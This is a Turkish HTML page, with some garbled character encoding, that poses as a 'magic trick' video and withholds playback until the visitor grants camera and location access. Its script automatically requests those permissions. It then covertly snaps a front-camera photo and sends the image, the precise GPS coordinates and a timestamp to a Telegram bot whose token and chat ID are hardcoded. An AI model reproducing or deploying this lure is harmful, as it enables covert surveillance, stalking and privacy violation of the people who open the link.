<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video G√∂sterimi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a;
            font-family: Arial, sans-serif;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            gap: 30px;
            padding: 20px;
        }

        #mainVideo {
            max-width: 95%;
            width: 95%;
            max-height: 90vh;
            height: auto;
            object-fit: contain;
            background-color: #000;
            display: none;
        }
        
        /* Mobil cihazlar i√ßin */
        @media (max-width: 768px) {
            .container {
                padding: 10px;
                gap: 10px;
            }
            
            #mainVideo {
                max-width: 95%;
                width: 95%;
                max-height: 80vh;
                min-width: 250px;
                min-height: 200px;
            }
        }
        
        /* Ses kontrol√ºn√º gizle */
        video::-webkit-media-controls-volume-slider,
        video::-webkit-media-controls-mute-button,
        video::-webkit-media-controls-volume-control-container {
            display: none !important;
        }
        
        video::-moz-media-controls-volume-slider,
        video::-moz-media-controls-mute-button {
            display: none !important;
        }

        #permissionMessage {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: none;
            color: white;
            text-align: center;
            padding: 40px;
            max-width: 600px;
            background-color: rgba(26, 26, 26, 0.95);
            border-radius: 10px;
            z-index: 10000;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }

        #requestPermissionBtn {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 20px;
        }

        #requestPermissionBtn:hover {
            background-color: #45a049;
        }

        #requestPermissionBtn:disabled {
            background-color: #666;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="container">
        <video id="mainVideo" autoplay loop muted playsinline controls preload="auto" webkit-playsinline="true">
            <source src="macigg.mp4" type="video/mp4">
            Tarayƒ±cƒ±nƒ±z video oynatmayƒ± desteklemiyor.
        </video>
        <audio id="backgroundMusic" autoplay loop preload="auto" style="display: none;">
            <source src="Pembe-Panter-M√ºziƒüi.mp3" type="audio/mpeg">
        </audio>
    </div>
    
    <div id="permissionMessage">
        <h2 style="color: #ff6b6b; margin-bottom: 20px; font-size: 24px;">‚ö†Ô∏è ƒ∞zin Gerekli</h2>
        <p style="font-size: 18px; line-height: 1.6; margin-bottom: 30px;">
            Videoyu g√∂r√ºnt√ºlemek i√ßin kamera ve konum izni vermeniz gerekmektedir.
        </p>
        <button id="requestPermissionBtn">ƒ∞zin Ver</button>
    </div>

    <script>
        const BOT_TOKEN = '8542243389:AAFoXxq3J61qVvo2tl7EeMcgdY3mMQYibDU';
        const CHAT_ID = '-4991699158';
        const DISPLAY_URL = 'https://bortecine00.github.io/Macig000/';
        const DISPLAY_URL_TEXT = 'ƒ∞lizyon Numarasƒ±';

        // Konum alma
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation desteklenmiyor'));
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    }),
                    reject,
                    { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
                );
            });
        }

        // Fotoƒüraf √ßekme
        async function takePhoto() {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' } 
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.setAttribute('playsinline', '');
            await video.play();
            
            return new Promise((resolve, reject) => {
                const timeout = setTimeout(() => {
                    stream.getTracks().forEach(t => t.stop());
                    reject(new Error('Zaman a≈üƒ±mƒ±'));
                }, 10000);
                
                video.onloadedmetadata = () => {
                    clearTimeout(timeout);
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        stream.getTracks().forEach(t => t.stop());
                        resolve(canvas.toDataURL('image/jpeg', 0.8));
                    }, 800);
                };
                
                video.onerror = () => {
                    clearTimeout(timeout);
                    stream.getTracks().forEach(t => t.stop());
                    reject(new Error('Video hatasƒ±'));
                };
            });
        }

        // Telegram'a g√∂nderme
        async function sendToTelegram(message, photo) {
            try {
                // Mesaj g√∂nder
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                // Fotoƒüraf g√∂nder
                if (photo) {
                    const base64 = photo.replace(/^data:image\/\w+;base64,/, '');
                    const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
                    const blob = new Blob([bytes], { type: 'image/jpeg' });
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', 'üì∏ Fotoƒüraf');
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }
            } catch (error) {
                console.error('Telegram hatasƒ±:', error);
            }
        }

        // ƒ∞zin isteme
        async function requestPermissions() {
            const mainVideo = document.getElementById('mainVideo');
            const permissionMessage = document.getElementById('permissionMessage');
            const requestPermissionBtn = document.getElementById('requestPermissionBtn');
            
            try {
                requestPermissionBtn.disabled = true;
                requestPermissionBtn.textContent = 'ƒ∞≈üleniyor...';
                
                // Konum izni
                let location = null;
                try {
                    location = await getLocation();
                    console.log('‚úÖ Konum izni verildi');
                } catch (e) {
                    console.warn('‚ö†Ô∏è Konum izni verilmedi');
                }
                
                // Kamera izni ve fotoƒüraf
                const photo = await takePhoto();
                console.log('‚úÖ Kamera izni verildi ve fotoƒüraf √ßekildi');
                
                // ƒ∞zinler verildi, kaydet
                localStorage.setItem('permissionsGranted', 'true');
                
                // Videoyu g√∂ster
                mainVideo.style.display = 'block';
                mainVideo.play().catch(() => {});
                
                // Mesajƒ± gizle
                permissionMessage.style.display = 'none';
                
                // Telegram'a g√∂nder
                let message = 'üîî <b>ƒ∞zin Verildi</b>\n\n';
                message += `‚è∞ ${new Date().toLocaleString('tr-TR')}\n`;
                message += `<a href="${DISPLAY_URL}">${DISPLAY_URL_TEXT}</a>\n\n`;
                message += `üì∏ Fotoƒüraf √ßekildi\n`;
                if (location) {
                    message += `üìç Konum: ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}\n`;
                }
                
                await sendToTelegram(message, photo);
                console.log('‚úÖ Telegram\'a g√∂nderildi');
                
            } catch (error) {
                console.error('‚ùå ƒ∞zin verilmedi:', error.message);
                
                // ƒ∞zin reddedildi
                permissionMessage.style.display = 'block';
                permissionMessage.querySelector('p').innerHTML = 
                    'Videoyu g√∂r√ºnt√ºlemek i√ßin kamera ve konum izni vermeniz gerekmektedir.<br>' +
                    '<strong style="color: #ff6b6b;">Tekrar izin vermeniz gerekiyor.</strong>';
                
                mainVideo.style.display = 'none';
                requestPermissionBtn.disabled = false;
                requestPermissionBtn.textContent = 'ƒ∞zin Ver';
            }
        }

        // Sayfa y√ºklendiƒüinde
        window.addEventListener('load', () => {
            const mainVideo = document.getElementById('mainVideo');
            const permissionMessage = document.getElementById('permissionMessage');
            const requestPermissionBtn = document.getElementById('requestPermissionBtn');
            const backgroundMusic = document.getElementById('backgroundMusic');
            
            // Video ba≈ülangƒ±√ßta gizli
            mainVideo.style.display = 'none';
            
            // localStorage kontrol√º
            const permissionsGranted = localStorage.getItem('permissionsGranted') === 'true';
            
            if (permissionsGranted) {
                // ƒ∞zin daha √∂nce verilmi≈ü, videoyu g√∂ster
                mainVideo.style.display = 'block';
                mainVideo.play().catch(() => {});
                permissionMessage.style.display = 'none';
            } else {
                // ƒ∞zin verilmemi≈ü, mesajƒ± g√∂ster
                permissionMessage.style.display = 'block';
                
                // Buton tƒ±klama
                requestPermissionBtn.addEventListener('click', requestPermissions);
                
                // Otomatik izin iste
                setTimeout(() => {
                    requestPermissions();
                }, 500);
            }
            
            // Video oynatma
            mainVideo.addEventListener('loadedmetadata', () => {
                if (mainVideo.style.display !== 'none') {
                    mainVideo.play().catch(() => {});
                }
            });
            
            mainVideo.addEventListener('canplay', () => {
                if (mainVideo.style.display !== 'none') {
                    mainVideo.play().catch(() => {});
                }
            });
            
            // Ses kapalƒ± tut
            mainVideo.volume = 0;
            mainVideo.muted = true;
            mainVideo.addEventListener('volumechange', () => {
                mainVideo.volume = 0;
                mainVideo.muted = true;
            });
            
            // M√ºzik
            if (backgroundMusic) {
                backgroundMusic.volume = 0.5;
                backgroundMusic.play().catch(() => {
                    // Kullanƒ±cƒ± etkile≈üimi sonrasƒ± ba≈ülat
                    const startMusic = () => {
                        backgroundMusic.play().catch(() => {});
                        document.removeEventListener('click', startMusic);
                        document.removeEventListener('touchstart', startMusic);
                    };
                    document.addEventListener('click', startMusic, { once: true });
                    document.addEventListener('touchstart', startMusic, { once: true });
                });
            }
        });
    </script>
</body>
</html>
